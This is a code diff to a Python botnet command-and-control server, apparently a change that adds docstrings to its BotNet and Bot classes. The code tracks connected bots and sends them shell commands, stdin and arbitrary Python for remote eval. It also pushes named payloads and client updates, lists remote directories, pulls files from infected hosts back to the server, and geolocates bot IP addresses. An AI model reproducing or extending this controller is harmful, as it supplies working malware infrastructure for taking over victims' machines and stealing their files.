@@ -43,16 +43,29 @@ class BotNet(Thread):
         self.downloaddir = downloadpath
 
     def checkDB(self):
+        '''
+        Perform database checks with app context
+        '''
         with self.app.app_context():
             self.filemanager.checkDatabase()
 
     def hasConnection(self, user):
+        '''
+        :param user: username of bot
+        :return: boolean if bot is in online or offline groups
+        '''
         with self.connlock:
             if user in self.offlineConnections:
                 return True
             return user in self.onlineConnections
 
-    def addConnection(self, user, clientsock, host_info, socketio):
+    def addConnection(self, user, clientsock, host_info):
+        '''
+        Adds a connection to the network
+        :param user: username
+        :param clientsock: communication socket
+        :param host_info: information (user, arch, version, id)
+        '''
         print("[*] Adding connection {}".format(user))
         with self.connlock:
             if user in self.offlineConnections:
@@ -62,7 +75,7 @@ class BotNet(Thread):
                 conn.setsocket(clientsock)
                 print("\tRestored!")
             else:
-                conn = Bot(clientsock, host_info, socketio)
+                conn = Bot(clientsock, host_info, self.socketio)
             if conn.bid is None:
                 conn.setId(str(uuid.uuid4()))
             self.onlineConnections[user] = conn
@@ -72,6 +85,10 @@ class BotNet(Thread):
             self.socketio.emit('connection', {'user': user}, namespace='/bot')
 
     def removeConnection(self, user):
+        '''
+        Remove connection from online/offline storage
+        :param user: username of connection
+        '''
         # Will be making changes to allConnections
         print("[*] Removing user {}".format(user))
         with self.connlock:
@@ -90,6 +107,10 @@ class BotNet(Thread):
                 self.offlineConnections.pop(user)
 
     def setOffline(self, user):
+        '''
+        Sets a user offline
+        :param user: username of connection
+        '''
         # Will be making changes to allConnections
         print("[*] Setting {} offline".format(user))
         with self.connlock:
@@ -106,13 +127,16 @@ class BotNet(Thread):
                 print("[-] Lost connection to {}".format(user))
 
     def getOnlineConnections(self):
+        '''
+        :return: List of online connections
+        '''
         with self.connlock:
             return self.onlineConnections.keys()
 
     def getConnectionDetails(self, spec=None):
-        """
-        Returns a dictionary of {[username]:{"online":[T/F], "lastonline":[unixtime], "arch":[arch]}, ...}
-        """
+        '''
+        :return: a dictionary of {[username]:{"online":[T/F], "lastonline":[unixtime], "arch":[arch]}, ...}
+        '''
         with self.connlock:
             if spec:
                 if spec in self.onlineConnections:
@@ -134,6 +158,9 @@ class BotNet(Thread):
                 return dets
 
     def run(self):
+        '''
+        Parse information coming from bots, loops
+        '''
         while True:
             with self.connlock:
                 bots = list(self.onlineConnections.values())
@@ -224,6 +251,11 @@ class BotNet(Thread):
                         self.setOffline(user)
 
     def getLog(self, user):
+        '''
+        Return recent output log of bot
+        :param user: username of bot
+        :return: log
+        '''
         with self.connlock:
             log = []
             if user in self.logs:
@@ -232,11 +264,20 @@ class BotNet(Thread):
             return log
 
     def clearLog(self, user):
+        '''
+        Clears log of bot
+        :param user: username of bot
+        '''
         with self.connlock:
             if user in self.logs:
                 self.logs[user].log = []
 
     def sendKillProc(self, user):
+        '''
+        Tell bot to kill and restart process
+        :param user: username of bot
+        :return: True/False if command sent
+        '''
         with self.connlock:
             if user in self.onlineConnections:
                 self.onlineConnections[user].send("True", sendtype="kill")
@@ -246,6 +287,12 @@ class BotNet(Thread):
             return False
 
     def sendStdin(self, user, cmd):
+        '''
+        Send stdin to bot process
+        :param user: username of bot
+        :param cmd: stdin to write
+        :return: True/False sent/queued
+        '''
         with self.connlock:
             if user in self.onlineConnections:
                 self.logs[user].logstdin(cmd)
@@ -261,6 +308,12 @@ class BotNet(Thread):
             return False
 
     def sendCmd(self, user, cmd):
+        '''
+        Send command to spawn new proc
+        :param user: username of bot
+        :param cmd: proc to spawn
+        :return: True/False sent/queued
+        '''
         with self.connlock:
             if user in self.onlineConnections:
                 self.logs[user].logsdin("(cmd \"" + cmd + "\")")
@@ -275,6 +328,12 @@ class BotNet(Thread):
             return False
 
     def sendEval(self, user, cmd):
+        '''
+        Send code to python eval on bot
+        :param user: username of bot
+        :param cmd: code to eval
+        :return: True/False if sent/queued
+        '''
         with self.connlock:
             if user in self.onlineConnections:
                 self.onlineConnections[user].send(cmd, sendtype="eval")
@@ -287,6 +346,13 @@ class BotNet(Thread):
             return False
 
     def sendFile(self, user, filename, fileobj):
+        '''
+        Send a file to the bot
+        :param user: username of bot
+        :param filename: filename
+        :param fileobj: file object
+        :return: True/False sent
+        '''
         with self.connlock:
             if user in self.onlineConnections:
                 self.onlineConnections[user].sendFile(filename, fileobj)
@@ -299,6 +365,12 @@ class BotNet(Thread):
             return False
 
     def startFileDownload(self, user, filename):
+        '''
+        Send command to start file download to server
+        :param user: username of bot
+        :param filename: path of file to download
+        :return: True/False if sent/queued
+        '''
         with self.connlock:
             if user in self.onlineConnections:
                 if not self.filemanager.fileIsDownloading(user, filename):
@@ -311,12 +383,23 @@ class BotNet(Thread):
             return None
 
     def getPayloadNames(self):
+        ''':return: payload names'''
         return self.payloadmanager.getPayloadNames()
 
     def getPayloads(self):
+        '''
+        :return: payload names and details
+        '''
         return self.payloadmanager.getPayloads()
 
     def sendPayload(self, user, payload, args):
+        '''
+        Send a payload by name with arguments
+        :param user: username of bot to which to send payload
+        :param payload: name of payload
+        :param args: args for payload
+        :return: True/False if successfully sent/queued
+        '''
         payloadtext = self.payloadmanager.getPayloadText(payload, args)
         if payloadtext:
             with self.connlock:
@@ -327,20 +410,39 @@ class BotNet(Thread):
             return False
 
     def requestLs(self, user, filename):
+        '''
+        Request that the bot provide an ls return
+        :param user: username of bot
+        :param filename: path for requested ls
+        '''
         with self.connlock:
             if user in self.onlineConnections:
                 self.onlineConnections[user].requestLs(filename)
 
     def getFileManager(self):
+        ''':return: file manager'''
         return self.filemanager
 
     def getDownloadFiles(self):
+        ''':return: files available for download + info'''
         return self.filemanager.getFilesAndInfo()
 
     def getFileName(self, user, filename):
+        '''
+        Gets the local name of a remote file after download
+        :param user: username of bot
+        :param filename: remote filename
+        :return: local filename
+        '''
         return self.filemanager.getFileName(user, filename)
 
     def deleteFile(self, user, filename):
+        '''
+        Delete a local instance of a file
+        :param user: username of bot
+        :param filename: remote name of file
+        :return: True/False if deleted
+        '''
         return self.filemanager.deleteFile(user, filename)
 
 
@@ -374,11 +476,21 @@ class Bot:
         self.opqueue = []
 
     def getState(self, ip):
+        '''
+        Get the State in which the ip resides
+        :param ip: ip to check
+        :return: State
+        '''
         response = urllib.request.urlopen("http://www.freegeoip.net/json/{}".format(ip)).read()
         state = json.loads(response.decode('UTF-8'))['region_code']
         return state
 
     def send(self, cmd, sendtype="stdin"):
+        '''
+        Send a command to the bot
+        :param cmd: command text
+        :param sendtype: type of command (stdin, cmd, eval)
+        '''
         print("[*] Sending command of type {} to {}".format(sendtype, self.user))
         json_str = json.dumps({sendtype: cmd})
         with self.datalock:
@@ -388,6 +500,10 @@ class Bot:
                 self.opqueue.append((self.send, (cmd, sendtype)))
 
     def setId(self, bid):
+        '''
+        Set the id of the bot (calls back with it later)
+        :param bid: id for future callback
+        '''
         print("[*] Setting bot id to {}".format(bid))
         json_str = json.dumps({Bot.ASSIGN_ID:bid})
         with self.datalock:
@@ -398,6 +514,10 @@ class Bot:
                 self.opqueue.append((self.setId,(bid,)))
 
     def recv(self):
+        '''
+        Receive data from the bot (blocking)
+        :return: bytes
+        '''
         # Getting the object requires a lock, using it doesn't
         with self.datalock:
             sock = self.sock
@@ -413,6 +533,11 @@ class Bot:
                 raise e
 
     def setsocket(self, newsock, nowonline=True):
+        '''
+        Swap the socket with a new one
+        :param newsock: new socket to use
+        :param nowonline: should the bot now be considered online?
+        '''
         with self.datalock:
             if self.online:
                 self.sock.close()
@@ -428,10 +553,18 @@ class Bot:
                 self.opqueue.clear()
 
     def setip(self, ip):
+        '''
+        Set the ip of the bot
+        :param ip: new ip
+        '''
         with self.datalock:
             self.ip = ip
 
     def close(self):
+        '''
+        Close the socket and set the bot offline
+        :return: True of now closed and wasn't before
+        '''
         with self.datalock:
             if self.online:
                 self.online = False
@@ -444,11 +577,11 @@ class Bot:
             return False
 
     def fileno(self):
-        """
+        '''
         Returns the OS fileno of the underlying socket, that way the
         OS can wait for IO on the fileno and allow us to serve many bots
         simultaneously
-        """
+        '''
         with self.datalock:
             if self.online:
                 return self.sock.fileno()
@@ -456,6 +589,11 @@ class Bot:
                 return -1
 
     def sendFile(self, filename, fileobj):
+        '''
+        Send a file to the bot (non-blocking)
+        :param filename: name of file
+        :param fileobj: file object
+        '''
         with self.datalock:
             if self.online:
                 t = Thread(target=self.__sendFileHelper(fileobj, filename))
@@ -464,9 +602,16 @@ class Bot:
                 self.opqueue.append((self.sendFile, (filename, fileobj)))
 
     def sendClientFile(self, fileobj):
+        '''
+        Upload a new client file to the bot (update)
+        :param fileobj: client file object
+        '''
         self.sendFile(None, fileobj)
 
     def __sendFileHelper(self, fileobj, filename=None):
+        '''
+        Helper function for threads
+        '''
         dat = fileobj.read(Bot.FILE_SHARD_SIZE)
         if len(dat) > 0:
             while len(dat) > 0:
@@ -494,6 +639,10 @@ class Bot:
                                    namespace='/bot')
 
     def startFileDownload(self, filename):
+        '''
+        Tell a bot to start sending back file data
+        :param filename: path to file
+        '''
         with self.datalock:
             if self.online:
                 json_str = json.dumps({Bot.FILE_DOWNLOAD: filename})
@@ -502,6 +651,10 @@ class Bot:
                 self.opqueue.append((self.startFileDownload, (filename,)))
 
     def requestLs(self, filename):
+        '''
+        Tell a bot to send back directory listing
+        :param filename: path to directory
+        '''
         with self.datalock:
             if self.online:
                 json_str = json.dumps({Bot.LS_JSON: filename})
